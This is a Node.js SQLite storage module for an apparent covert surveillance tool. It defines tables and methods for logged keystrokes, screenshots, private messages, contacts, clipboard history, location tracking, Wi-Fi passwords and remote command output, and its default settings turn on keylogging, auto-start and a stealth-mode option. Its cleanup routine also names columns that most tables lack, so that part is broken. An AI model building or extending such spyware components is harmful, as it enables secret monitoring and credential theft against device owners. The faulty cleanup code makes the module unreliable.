const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs').promises;
const Logger = require('../utils/Logger');

class Database {
    constructor() {
        this.logger = new Logger();
        this.dbPath = process.env.DATABASE_FILE || './data/monitoring.db';
        this.db = null;
    }
    
    async initialize() {
        try {
            // Ensure directory exists
            const dir = path.dirname(this.dbPath);
            await fs.mkdir(dir, { recursive: true });
            
            // Open database connection
            this.db = await this.openDatabase();
            
            // Create tables
            await this.createTables();
            
            // Initialize default settings
            await this.initializeSettings();
            
            this.logger.info('Database initialized successfully');
            
        } catch (error) {
            this.logger.error('Database initialization failed:', error);
            throw error;
        }
    }
    
    openDatabase() {
        return new Promise((resolve, reject) => {
            const db = new sqlite3.Database(this.dbPath, (err) => {
                if (err) {
                    reject(err);
                } else {
                    this.logger.info(`Connected to SQLite database: ${this.dbPath}`);
                    resolve(db);
                }
            });
        });
    }
    
    async createTables() {
        const queries = [
            // Activity logs table
            `CREATE TABLE IF NOT EXISTS activity_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT NOT NULL,
                data TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Keylogs table
            `CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                keys TEXT NOT NULL,
                window TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Screenshots table
            `CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                filename TEXT NOT NULL,
                path TEXT NOT NULL,
                size INTEGER,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Files table
            `CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                filename TEXT NOT NULL,
                path TEXT NOT NULL,
                size INTEGER,
                type TEXT,
                uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Notifications table
            `CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                app TEXT NOT NULL,
                title TEXT,
                text TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Messages table
            `CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                sender TEXT,
                recipient TEXT,
                content TEXT,
                type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Contacts table
            `CREATE TABLE IF NOT EXISTS contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                phone TEXT,
                email TEXT,
                added_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Location history table
            `CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                altitude REAL,
                provider TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Commands history table
            `CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT NOT NULL,
                output TEXT,
                status TEXT,
                executed_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Settings table
            `CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // System info snapshots
            `CREATE TABLE IF NOT EXISTS system_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cpu_usage REAL,
                memory_usage REAL,
                disk_usage REAL,
                network_info TEXT,
                battery_level INTEGER,
                snapshot_time DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Clipboard history
            `CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                content TEXT,
                type TEXT,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // Installed apps
            `CREATE TABLE IF NOT EXISTS installed_apps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                package_name TEXT UNIQUE,
                app_name TEXT,
                version TEXT,
                install_date DATETIME,
                last_updated DATETIME,
                discovered_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`,
            
            // WiFi networks
            `CREATE TABLE IF NOT EXISTS wifi_networks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ssid TEXT,
                bssid TEXT,
                security TEXT,
                signal_strength INTEGER,
                connected BOOLEAN,
                password TEXT,
                discovered_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`
        ];
        
        for (const query of queries) {
            await this.run(query);
        }
    }
    
    async initializeSettings() {
        const defaultSettings = {
            screenshotInterval: '300000',
            keylogBuffer: '100',
            maxFileSize: '52428800',
            enableScreenshots: 'true',
            enableKeylogging: 'true',
            enableFileManager: 'true',
            enableNotifications: 'true',
            enableLocation: 'true',
            enableSystemInfo: 'true',
            autoStart: 'true',
            stealthMode: 'false'
        };
        
        for (const [key, value] of Object.entries(defaultSettings)) {
            await this.run(
                'INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)',
                [key, value]
            );
        }
    }
    
    // Database helper methods
    
    run(query, params = []) {
        return new Promise((resolve, reject) => {
            this.db.run(query, params, function(err) {
                if (err) {
                    reject(err);
                } else {
                    resolve({ id: this.lastID, changes: this.changes });
                }
            });
        });
    }
    
    get(query, params = []) {
        return new Promise((resolve, reject) => {
            this.db.get(query, params, (err, row) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(row);
                }
            });
        });
    }
    
    all(query, params = []) {
        return new Promise((resolve, reject) => {
            this.db.all(query, params, (err, rows) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(rows);
                }
            });
        });
    }
    
    // Activity logging methods
    
    async logActivity(type, data) {
        try {
            const jsonData = JSON.stringify(data);
            await this.run(
                'INSERT INTO activity_logs (type, data) VALUES (?, ?)',
                [type, jsonData]
            );
        } catch (error) {
            this.logger.error('Failed to log activity:', error);
        }
    }
    
    async getActivityLogs(limit = 100) {
        const logs = await this.all(
            'SELECT * FROM activity_logs ORDER BY timestamp DESC LIMIT ?',
            [limit]
        );
        
        return logs.map(log => ({
            ...log,
            data: JSON.parse(log.data || '{}')
        }));
    }
    
    // Keylog methods
    
    async saveKeylog(keys, window = null) {
        await this.run(
            'INSERT INTO keylogs (keys, window) VALUES (?, ?)',
            [keys, window]
        );
    }
    
    async getKeylogs(limit = 100) {
        return await this.all(
            'SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?',
            [limit]
        );
    }
    
    // Screenshot methods
    
    async saveScreenshot(filename, path, size) {
        await this.run(
            'INSERT INTO screenshots (filename, path, size) VALUES (?, ?, ?)',
            [filename, path, size]
        );
    }
    
    async getScreenshots(limit = 50) {
        return await this.all(
            'SELECT * FROM screenshots ORDER BY timestamp DESC LIMIT ?',
            [limit]
        );
    }
    
    // File management methods
    
    async saveFile(filename, path, size, type) {
        await this.run(
            'INSERT INTO files (filename, path, size, type) VALUES (?, ?, ?, ?)',
            [filename, path, size, type]
        );
    }
    
    async getFiles(limit = 100) {
        return await this.all(
            'SELECT * FROM files ORDER BY uploaded_at DESC LIMIT ?',
            [limit]
        );
    }
    
    // Notification methods
    
    async saveNotification(app, title, text) {
        await this.run(
            'INSERT INTO notifications (app, title, text) VALUES (?, ?, ?)',
            [app, title, text]
        );
    }
    
    async getNotifications(limit = 50) {
        return await this.all(
            'SELECT * FROM notifications ORDER BY timestamp DESC LIMIT ?',
            [limit]
        );
    }
    
    // Message methods
    
    async saveMessage(sender, recipient, content, type = 'text') {
        await this.run(
            'INSERT INTO messages (sender, recipient, content, type) VALUES (?, ?, ?, ?)',
            [sender, recipient, content, type]
        );
    }
    
    async getMessages(limit = 100) {
        return await this.all(
            'SELECT * FROM messages ORDER BY timestamp DESC LIMIT ?',
            [limit]
        );
    }
    
    // Location methods
    
    async saveLocation(latitude, longitude, accuracy, altitude = null, provider = null) {
        await this.run(
            'INSERT INTO locations (latitude, longitude, accuracy, altitude, provider) VALUES (?, ?, ?, ?, ?)',
            [latitude, longitude, accuracy, altitude, provider]
        );
    }
    
    async getLocations(limit = 50) {
        return await this.all(
            'SELECT * FROM locations ORDER BY timestamp DESC LIMIT ?',
            [limit]
        );
    }
    
    async getLastLocation() {
        return await this.get(
            'SELECT * FROM locations ORDER BY timestamp DESC LIMIT 1'
        );
    }
    
    // Command execution methods
    
    async saveCommand(command, output, status = 'success') {
        await this.run(
            'INSERT INTO commands (command, output, status) VALUES (?, ?, ?)',
            [command, output, status]
        );
    }
    
    async getCommands(limit = 50) {
        return await this.all(
            'SELECT * FROM commands ORDER BY executed_at DESC LIMIT ?',
            [limit]
        );
    }
    
    // Settings methods
    
    async getSetting(key) {
        const row = await this.get(
            'SELECT value FROM settings WHERE key = ?',
            [key]
        );
        return row ? row.value : null;
    }
    
    async setSetting(key, value) {
        await this.run(
            'INSERT OR REPLACE INTO settings (key, value, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)',
            [key, value]
        );
    }
    
    async getSettings() {
        const rows = await this.all('SELECT * FROM settings');
        const settings = {};
        
        for (const row of rows) {
            // Convert string booleans and numbers
            let value = row.value;
            if (value === 'true') value = true;
            else if (value === 'false') value = false;
            else if (!isNaN(value)) value = Number(value);
            
            settings[row.key] = value;
        }
        
        return settings;
    }
    
    // System info methods
    
    async saveSystemInfo(cpuUsage, memoryUsage, diskUsage, networkInfo, batteryLevel = null) {
        await this.run(
            'INSERT INTO system_info (cpu_usage, memory_usage, disk_usage, network_info, battery_level) VALUES (?, ?, ?, ?, ?)',
            [cpuUsage, memoryUsage, diskUsage, JSON.stringify(networkInfo), batteryLevel]
        );
    }
    
    async getSystemInfo(limit = 100) {
        const rows = await this.all(
            'SELECT * FROM system_info ORDER BY snapshot_time DESC LIMIT ?',
            [limit]
        );
        
        return rows.map(row => ({
            ...row,
            network_info: JSON.parse(row.network_info || '{}')
        }));
    }
    
    // Clipboard methods
    
    async saveClipboard(content, type = 'text') {
        // Check if the same content already exists
        const existing = await this.get(
            'SELECT id FROM clipboard_history WHERE content = ? ORDER BY captured_at DESC LIMIT 1',
            [content]
        );
        
        if (!existing) {
            await this.run(
                'INSERT INTO clipboard_history (content, type) VALUES (?, ?)',
                [content, type]
            );
        }
    }
    
    async getClipboardHistory(limit = 50) {
        return await this.all(
            'SELECT * FROM clipboard_history ORDER BY captured_at DESC LIMIT ?',
            [limit]
        );
    }
    
    // App management methods
    
    async saveApp(packageName, appName, version, installDate = null) {
        await this.run(
            'INSERT OR REPLACE INTO installed_apps (package_name, app_name, version, install_date, last_updated) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)',
            [packageName, appName, version, installDate]
        );
    }
    
    async getInstalledApps() {
        return await this.all(
            'SELECT * FROM installed_apps ORDER BY app_name ASC'
        );
    }
    
    // WiFi methods
    
    async saveWiFiNetwork(ssid, bssid, security, signalStrength, connected = false, password = null) {
        await this.run(
            'INSERT OR REPLACE INTO wifi_networks (ssid, bssid, security, signal_strength, connected, password) VALUES (?, ?, ?, ?, ?, ?)',
            [ssid, bssid, security, signalStrength, connected, password]
        );
    }
    
    async getWiFiNetworks() {
        return await this.all(
            'SELECT * FROM wifi_networks ORDER BY signal_strength DESC'
        );
    }
    
    // Cleanup methods
    
    async cleanupOldData(daysToKeep = 30) {
        const cutoffDate = new Date();
        cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
        const cutoffTimestamp = cutoffDate.toISOString();
        
        const tables = [
            'activity_logs',
            'keylogs',
            'screenshots',
            'notifications',
            'messages',
            'locations',
            'commands',
            'system_info',
            'clipboard_history'
        ];
        
        for (const table of tables) {
            await this.run(
                `DELETE FROM ${table} WHERE timestamp < ? OR captured_at < ? OR snapshot_time < ? OR executed_at < ?`,
                [cutoffTimestamp, cutoffTimestamp, cutoffTimestamp, cutoffTimestamp]
            );
        }
        
        // Vacuum to reclaim space
        await this.run('VACUUM');
    }
    
    // Statistics methods
    
    async getStatistics() {
        const stats = {};
        
        const tables = [
            'activity_logs',
            'keylogs',
            'screenshots',
            'files',
            'notifications',
            'messages',
            'contacts',
            'locations',
            'commands',
            'clipboard_history',
            'installed_apps',
            'wifi_networks'
        ];
        
        for (const table of tables) {
            const result = await this.get(`SELECT COUNT(*) as count FROM ${table}`);
            stats[table] = result.count;
        }
        
        // Get database file size
        try {
            const stat = await fs.stat(this.dbPath);
            stats.databaseSize = stat.size;
        } catch (error) {
            stats.databaseSize = 0;
        }
        
        return stats;
    }
    
    async close() {
        return new Promise((resolve, reject) => {
            if (this.db) {
                this.db.close((err) => {
                    if (err) {
                        reject(err);
                    } else {
                        this.logger.info('Database connection closed');
                        resolve();
                    }
                });
            } else {
                resolve();
            }
        });
    }
}

module.exports = Database;